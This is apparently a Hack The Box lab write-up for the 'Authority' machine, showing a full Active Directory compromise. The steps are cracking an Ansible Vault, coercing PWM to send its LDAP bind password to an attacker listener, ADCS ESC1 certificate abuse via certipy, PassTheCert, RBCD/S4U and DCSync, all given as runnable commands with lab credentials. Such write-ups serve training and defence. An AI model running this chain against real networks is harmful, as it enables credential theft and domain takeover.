

**Box:** Authority · **Domain:** authority.htb (also `htb.corp`) · **DC:** AUTHORITY

**Full chain (one line):**

Guest reads **Development** SMB share → Ansible **PWM** role has an **Ansible-Vault** secret → crack with `ansible2john` + john (`!@#$%^&*`) → `ansible-vault decrypt` → PWM admin creds → in PWM **config editor, point LDAP at a plaintext/attacker URL and "test"** → PWM replays the stored bind password → **`svc_ldap : lDaP_1n_th3_cle4r!`** → evil-winrm (user) → **ADCS ESC1 (CorpVPN)** → add a machine account → request a cert as Administrator → PKINIT fails (`KDC_ERR_PADATA_TYPE_NOSUPP`) → **PassTheCert** over LDAPS → either add svc_ldap to Administrators (**Path 1**) or RBCD→S4U→DCSync (**Path 2**) → **Administrator**.

---

## Phase 1 — Recon

nmap: 53 DNS, 88 Kerberos, 80 HTTP (IIS), 135/139/445 SMB, 389/636 LDAP(S), 5985 WinRM, and **8443 Tomcat** serving **PWM**. The cert SANs give the names:

```
UPN: AUTHORITY$@htb.corp · DNS: authority.htb.corp, htb.corp, HTB
```
A
dd everything to hosts and sync the clock (you'll need Kerberos later):

```bash
echo '10.129.229.56 authority.htb authority.htb.corp htb.corp HTB authority.authority.htb' | sudo tee -a /etc/hosts

sudo ntpdate authority.htb
```

### PWM on 8443 (and the things that confused me)

`https://authority.htb:8443/pwm/` is **PWM** — an open-source self-service password portal that binds to AD with a service account.

- It's in **"open configuration mode"** — the banner literally says *"PWM is in open configuration mode and is not secure."* That means the config can be edited once you get into the config manager. **This is the whole point of the box.**
- Logging in with junk gives `5017 ERROR_DIRECTORY_UNAVAILABLE … PKIX path building failed … unable to bind to ldaps://authority.authority.htb:636` — PWM can't reach its LDAP over LDAPS because of a **TLS trust failure**. Useful intel: PWM talks to LDAP, and we can influence *how*.
- The mangled `&amp;amp;…{ 5089 ERROR_PASSWORD_ONLY_BAD }` blob is **not SQLi** — it's just an error string getting HTML-entity-encoded several times over. Ignore it.
- **"Previous Authentications"** listing `CN=svc_pwm,CN=Users,DC=htb,DC=corp` is **not network hops** — it's PWM's own audit log of who authenticated *to PWM*. It leaks the LDAP bind account name: **svc_pwm**.
- Intermittent **500 / `file is being used by another process` / `CONFIG_FORMAT_ERROR`**: PWM gets into a wedged state (often after aggressive scanning). It's not a defense aimed at you — if the login/config pages 500 and stay broken, **reset the box**. (Avoid hammering it with ferox while you work the config.)

---

## Phase 2 — Guest SMB → Ansible → PWM admin creds

nxc with null/guest:

```bash
nxc smb 10.129.229.56 -u guest -p ''
```

→ authenticates, and **Development** is readable as guest, download it:

```bash
smbclient //10.129.229.56/Development -U 'guest%' -c 'prompt OFF; recurse ON; mget *'
```

It's an Ansible repo. Grep the lot:

```bash
grep -RniE 'password|secret|credential|vault|bind|ldap|pwm_admin|administrator' .
```

Key files:
- `Automation/Ansible/PWM/defaults/main.yml` → **Ansible-Vault-encrypted** values for the PWM admin login/password and the LDAP admin password (`$ANSIBLE_VAULT;...`).
- `Automation/Ansible/PWM/README.md` → defaults (`root:password`), `ansible_inventory` → `administrator:Welcome1` (a decoy — doesn't work live), Tomcat creds in templates (also decoys).
- `Automation/Ansible/LDAP/README.md` → example creds (`sunrise`, user `hoshimiya.ichigo`) — more decoys.

### Crack the Ansible Vault (two-layer — note this carefully)

Hashcat has no mode for Ansible Vault, so use **john** via `ansible2john`. Format each encrypted blob into its own file (header line + hex body), then:

```bash
python /usr/share/john/ansible2john.py pwm_admin pwm_pass ldap_pass > hashes
john --wordlist=rockyou.txt hashes
```

→ all three "crack" to **`!@#$%^&*`**. 

> **The trap I fell for:** `!@#$%^&*` is **not** the admin password — it's the **vault password** that *decrypts* the file. Two layers: john gives you the vault password; you then **decrypt the vault** to get the real secrets:


```bash
pipx install ansible-core

cat pwm_admin | ansible-vault decrypt      # enter !@#$%^&*
cat pwm_pass  | ansible-vault decrypt
cat ldap_pass | ansible-vault decrypt
```
→
```
pwm admin login : svc_pwm
pwm admin pass  : pWm_@dm!N_!23
ldap admin pass : DevT3st@123
```

---

## Phase 3 — PWM config editor → capture svc_ldap in cleartext

Log into the **config manager / editor** with `svc_pwm : pWm_@dm!N_!23` (the `/pwm/private/config/login` route; the normal `/private/login` may be wedged — reset if so).

The move: in the **LDAP settings**, change the LDAP server URL from `ldaps://…:636` to a **plaintext `ldap://` URL pointing at your box** (or just force plaintext), start a listener, then hit **"Test LDAP Profile"**. PWM dutifully **binds using the stored `svc_ldap` password** — and because it's now plaintext, you capture it:

```bash
sudo nc -lvnp 389          # or: sudo responder -I tun0 ; or a tiny ldap listener
```

→ **`svc_ldap : lDaP_1n_th3_cle4r!`**.

**"why not a password we already found, and how would anyone guess to do this?"**

PWM has to store the **live** LDAP bind password so it can connect to AD on every password-reset request. That password (`svc_ldap`) is *different* from the decoys in the repo (`DevT3st@123`, `sunrise`, `Welcome1`) — those were old/example values. You don't "guess" the password; you make PWM **hand it to you**: anything that stores a credential to use it can be coerced into *using* it against a target you control. Forcing plaintext LDAP + "test connection" is the canonical PWM/LDAP-app trick — whenever an app has a "test connection" button and a stored bind credential, that's your capture primitive.

> **Reminder:** keep the URL `ldap://` (plaintext), **not** `ldaps://` — over LDAPS the bind is encrypted and you get nothing.

```bash
evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'      # user shell
```

---

## Phase 4 — ADCS ESC1 (CorpVPN)

BloodHound as svc_ldap shows nothing exciting, but there's an **AD Certificate Services** CA — check it with certipy:

```bash
certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
```
→ **ESC1** on template **CorpVPN**.

### ESC1 in plain words

ESC1 is a misconfigured certificate template where **a low-priv user can enroll**, the template is for **client authentication**, and crucially it lets the **enrollee specify the subject (SAN/UPN)**. So you request a certificate and say *"this certificate is for `administrator@authority.htb`."* The CA signs it. Now you hold a cert that *proves you are the Administrator*, and you can authenticate as them. [Abusing Active Directory Certificate Services (Part 1) - Black Hills Information Security, Inc.](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/) 

**Steps in general:**

1. You need an identity that can enroll. Check the certificate template's `Enrollment right` and the listed users. In this case, it’s `Domain Computers`, who can enroll with this template. This means that any Domain Computers can request a certificate on behalf of a Domain Admin. We also have domain admin, enterprise admins, but we dont have any rights from there and so domain computer is the easy target.  For the `Domain Computer`' MachineAccountQuota is 10, so **add a computer account** (any domain user can).
2. **Request** a cert from the vulnerable template, setting `-upn administrator@…`.
3. **Authenticate** with the cert → get the admin's TGT/NT hash (or, if PKINIT is broken, pass-the-cert over LDAP).

Check MAQ, then add a machine account:

```bash
nxc ldap 10.129.91.166 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq        # MachineAccountQuota: 10

bloodyAD --host authority.htb -d authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!' --dc-ip 10.129.91.166 add computer hugu12 'Hugu123!!@'
```

**Gotcha I hit:** my first computer used a weak password (`hugu`) and the cert request died with `rpc_s_access_denied`. Recreating it with a **complexity-compliant password** (`Hugu123!!@`) fixed it — a machine-account password still has to satisfy the domain policy, or downstream RPC calls are refused. *(addcomputer.py works too: `addcomputer.py 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' -method LDAPS -computer-name hugu12 -computer-pass 'Hugu123!!@' -dc-ip 10.129.91.166`.)*

Request the certificate as Administrator:

```bash
certipy req -username 'hugu12$' -password 'Hugu123!!@' -ca AUTHORITY-CA -dc-ip 10.129.91.166 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
```

→ `administrator_authority.pfx` (cert + private key).

---

## Phase 5 — PKINIT fails → PassTheCert → Administrator

The normal step is `certipy auth` to turn the pfx into the admin's TGT/NT hash. It fails here:

```bash
certipy auth -pfx administrator_authority.pfx -dc-ip 10.129.91.166 -domain authority.htb
# ...
# [-] KDC_ERR_PADATA_TYPE_NOSUPP (KDC has no support for padata type)
```

**Why:** the DC isn't set up for **PKINIT** (no KDC/smart-card certificate installed), so Kerberos auth *with a certificate* can't work. (Also note: `certipy auth` with no target throws "Could not find a target" — always pass `-dc-ip` and `-domain`.)

**The fix (per SpecterOps):** if the cert can't do Kerberos, use it over **LDAPS via SChannel** — **PassTheCert**. You only get LDAP access, but the cert says you're a Domain Admin, so LDAP is plenty.

Split the pfx into separate key + cert files (**"create the key, add the cert"**):

```bash
certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key

certipy cert -pfx administrator_authority.pfx -nokey  -out administrator.crt

git clone https://github.com/AlmondOffSec/PassTheCert
```

### Path 1 — LDAP shell → add svc_ldap to Administrators (quick)

```bash
python PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.91.166
```

In the shell, grant your existing user admin and bail:

```
# add_user_to_group svc_ldap administrators
```

Reconnect as svc_ldap — now a local admin — and read root:

```bash
evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
# PS> type C:\Users\Administrator\Desktop\root.txt
```

### Path 2 — RBCD → S4U → DCSync (the "intended" route, with my kits)

Give the fake computer **resource-based constrained delegation** over the DC, then impersonate Administrator to it:

```bash
python PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'hugu12$' -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.91.166

sudo ntpdate 10.129.91.166

impacket-getST -spn 'cifs/AUTHORITY.AUTHORITY.HTB' -impersonate Administrator 'authority.htb/hugu12$:Hugu123!!@'

KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass

authority.htb/administrator@authority.authority.htb -just-dc-ntlm
```

→ Administrator NT hash → PtH over WinRM (FQDN):

```bash
evil-winrm -i authority.htb -u administrator -H <admin-nthash>
```

**Path 1 vs Path 2:** Path 1 is one LDAP command (`add_user_to_group`) and reuses a shell you already have — fastest. Path 2 (RBCD → S4U2Proxy → DCSync) is the "textbook" delegation abuse and hands you **every** hash (good for PtH/persistence). Both start from the same PassTheCert key/cert.

---

## Full chain (one glance)

```
guest → Development share (Ansible)
  │ ansible2john + john → vault pw !@#$%^&*  →  ansible-vault decrypt
svc_pwm : pWm_@dm!N_!23  (PWM admin)
  │ PWM config editor → LDAP URL → plaintext ldap:// + "Test" → capture bind
svc_ldap : lDaP_1n_th3_cle4r!  → evil-winrm (USER)
  │ certipy find → ESC1 (CorpVPN)
add computer (MAQ=10) → certipy req -upn administrator → administrator.pfx
  │ certipy auth → KDC_ERR_PADATA_TYPE_NOSUPP (no PKINIT)
split pfx → PassTheCert (LDAPS/SChannel)
  ├─ Path 1: add_user_to_group svc_ldap administrators → evil-winrm svc_ldap
  └─ Path 2: write_rbcd → getST S4U → secretsdump → evil-winrm -H
Administrator  👑
```

## Takeaways

1. **Guest/null SMB is always worth a check** — a readable share (Development) had the whole foothold.
2. **Ansible Vault is two layers:** `ansible2john`+john gives the **vault password**, then `ansible-vault decrypt` gives the **real secrets**. The john crack is *not* the admin password.
3. **An app with a stored bind credential + a "test connection" button = a capture primitive.** Force **plaintext** `ldap://` and let PWM hand you `svc_ldap`. (Never `ldaps://` — you'd only catch ciphertext.)
4. **Separate decoys from live creds** — repos are full of old example passwords; validate with nxc.
5. **ESC1 = you choose the cert's identity.** Add a machine account (MAQ), request as `administrator`, authenticate.
6. **Machine-account passwords must meet complexity** or RPC calls (`certipy req`) return `rpc_s_access_denied`.
7. **`KDC_ERR_PADATA_TYPE_NOSUPP` = no PKINIT on the DC → PassTheCert over LDAPS.** Split the pfx with `certipy cert -nocert/-nokey`, then `add_user_to_group` (fast) or `write_rbcd`→S4U→DCSync (full).
8. **PtH over WinRM: target the FQDN.**
